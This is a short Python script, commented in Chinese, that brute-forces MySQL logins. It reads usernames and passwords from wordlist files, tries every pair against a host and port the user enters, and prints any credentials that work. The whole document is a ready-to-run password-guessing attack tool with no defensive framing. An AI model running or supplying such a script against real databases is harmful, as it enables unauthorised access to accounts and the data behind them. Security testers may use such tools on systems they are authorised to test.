"""
Author:LuckyRiver
Date:2021
数据库爆破
"""
import pymysql

host = input("请输入主机:  ")
port = int(input("请输入端口:  "))

ff = open("../user.txt",'r')
user = ff.readline().strip()

while user:
    with open("../password.txt",'r') as f:
        password = f.readline().strip()

        while password:
            try:
                conn = pymysql.connect(host=host,port=port,user=user,password=password)
                print("爆破成功，用户名：%s ,密码为：%s"%(user,password))
                break
            except:
                pass
            password = f.readline().strip()
    user = ff.readline().strip()
